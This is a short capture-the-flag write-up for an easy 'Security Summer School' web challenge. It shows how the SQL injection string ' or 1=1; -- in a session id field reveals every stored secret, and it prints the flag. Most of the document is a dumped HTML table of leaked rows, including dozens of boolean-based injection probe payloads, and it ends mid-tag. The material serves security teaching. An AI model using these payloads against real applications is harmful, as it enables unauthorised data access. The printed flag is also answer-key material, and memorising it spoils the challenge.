---
Name: "Top Secret"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Using SQL injection to enumerate hidden application data."
---

# Top Secret
We can add secrets and view them

If in the session id field we use 
```txt
' or 1=1; --
```

We can see all of the secrets on the website, for example
```html
<tr><td>  SSS{u1tr4_m3g4_t0p_s3cr3t}  </td></tr><tr><td></td></tr><tr><td></td></tr><tr><td></td></tr><tr><td>asas</td></tr><tr><td></td></tr><tr><td>aaaa</td></tr><tr><td>test</td></tr><tr><td>abc</td></tr><tr><td>test</td></tr><tr><td>' OR 1=1 --</td></tr><tr><td></td></tr><tr><td>'</td></tr><tr><td>test</td></tr><tr><td>test</td></tr><tr><td>a</td></tr><tr><td>test</td></tr><tr><td>a</td></tr><tr><td>test</td></tr><tr><td>a</td></tr><tr><td>a</td></tr><tr><td>2240</td></tr><tr><td>a((()&quot;'))((</td></tr><tr><td>a'HoIRTw&lt;'&quot;&gt;bpkeLC</td></tr><tr><td>a' AND 3904=2058-- KHlg</td></tr><tr><td>a' AND 3530=3530-- zZAz</td></tr><tr><td>a') AND 2584=7585 AND ('ptnv'='ptnv</td></tr><tr><td>a') AND 3530=3530 AND ('jFkG'='jFkG</td></tr><tr><td>a')) AND 7881=6393 AND (('bZeo'='bZeo</td></tr><tr><td>a')) AND 3530=3530 AND (('eusr'='eusr</td></tr><tr><td>a'))) AND 2374=5626 AND ((('NAHZ'='NAHZ</td></tr><tr><td>a'))) AND 3530=3530 AND ((('hoqi'='hoqi</td></tr><tr><td>a' AND 7758=7517 AND 'hOcd'='hOcd</td></tr><tr><td>a' AND 3530=3530 AND 'RRGg'='RRGg</td></tr><tr><td>a') AND 3199=2593 AND ('GwNJ' LIKE 'GwNJ</td></tr><tr><td>a') AND 3530=3530 AND ('vfEK' LIKE 'vfEK</td></tr><tr><td>a')) AND 5257=2637 AND (('UxZJ' LIKE 'UxZJ</td></tr><tr><td>a')) AND 3530=3530 AND (('QVkr' LIKE 'QVkr</td></tr><tr><td>a%' AND 5105=2486 AND 'JDdj%'='JDdj</td></tr><tr><td>a%' AND 3530=3530 AND 'jQeQ%'='jQeQ</td></tr><tr><td>a' AND 4659=1079 AND 'Rvhu' LIKE 'Rvhu</td></tr><tr><td>a' AND 3530=3530 AND 'YKUi' LIKE 'YKUi</td></tr><tr><td>a&quot;) AND 1892=3795 AND (&quot;tEZo&quot;=&quot;tEZo</td></tr><tr><td>a&quot;) AND 3530=3530 AND (&quot;aIYE&quot;=&quot;aIYE</td></tr><tr><td>a&quot;)) AND 2418=6533 AND ((&quot;yEvY&quot;=&quot;yEvY</td></tr><tr><td>a&quot;)) AND 3530=3530 AND ((&quot;UEay&quot;=&quot;UEay</td></tr><tr><td>a&quot; AND 7539=7999 AND &quot;dgCE&quot;=&quot;dgCE</td></tr><tr><td>a&quot; AND 3530=3530 AND &quot;fhMS&quot;=&quot;fhMS</td></tr><tr><td>a&quot;) AND 6781=1711 AND (&quot;FEJg&quot; LIKE &quot;FEJg</td></tr><tr><td>a&quot;) AND 3530=3530 AND (&quot;VYgC&quot; LIKE &quot;VYgC</td></tr><tr><td>a&quot; AND 1916=7304 AND &quot;ALgL&quot; LIKE &quot;ALgL</td></tr><tr><td>a&quot; AND 3530=3530 AND &quot;yOOi&quot; LIKE &quot;yOOi</td></tr><tr><td>a' AND 7982=6897 OR 'eVSK'='vXgB</td></tr><tr><td>a' AND 3530=3530 OR 'PGVH'='mNNA</td></tr><tr><td>a) AND 4288=2818-- iUWK</td></tr><tr><td>a) AND 3530=3530-- iuTC</td></tr><tr><td>a) AND 8363=7186 AND (3274=3274</td></tr><tr><td>a) AND 3530=3530 AND (5041=5041</td></tr><tr><td>a)) AND 4841=9015 AND ((2257=2257</td></tr><tr><td>a)) AND 3530=3530 AND ((9549=9549</td></tr><tr><td>a))) AND 9981=4638 AND (((3562=3562</td></tr><tr><td>a))) AND 3530=3530 AND (((4525=4525</td></tr><tr><td>a AND 3454=2607</td></tr><tr><td>a AND 3530=3530</td></tr><tr><td>a AND 5516=5126-- DTPq</td></tr><tr><td>a AND 3530=3530-- wnuK</td></tr><tr><td>a AND 6018=3917# XqUN</td></tr><tr><td>a AND 3530=3530# ySpZ</td></tr><tr><td>-8162</td></tr><tr><td>-4940' OR 8205=5094-- uPYp</td></tr><tr><td>-9699' OR 4341=4341-- cDhU</td></tr><tr><td>-8779') OR 7633=9218 AND ('DfDc'='DfDc</td></tr><tr><td>-3942') OR 4341=4341 AND ('eXQE'='eXQE</td></tr><tr><td>-8993')) OR 5551=5973 AND (('HQLG'='HQLG</td></tr><tr><td>-6771')) OR 4341=4341 AND (('vOGE'='vOGE</td></tr><tr><td>-6445')) OR 6569=6571 AND (('MTex'='MTex</td></
```

```txt
SSS{u1tr4_m3g4_t0p_s3cr3t}
```

